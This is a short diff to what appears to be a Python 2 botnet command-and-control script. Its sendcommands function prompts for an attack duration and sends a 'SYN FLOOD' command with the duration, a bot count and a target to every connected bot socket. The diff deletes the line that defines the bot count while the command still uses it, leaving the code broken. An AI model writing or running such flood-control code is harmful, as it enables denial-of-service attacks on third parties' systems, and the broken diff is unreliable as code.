@@ -26,7 +26,6 @@ def sendcommands(clientsocketsaddresssource):
 		for row in clientsocketsaddresssource:
 			if int(input_get) == 1:
 				duration = raw_input("Enter the duration of the attack in seconds: ")
-				numberofbots = raw_input("Enter the number of bots to send this to: ")
 				command = "\t".join(("SYN FLOOD", str(duration), str(numberofbots), TARGET))
 				row.send(command)
 
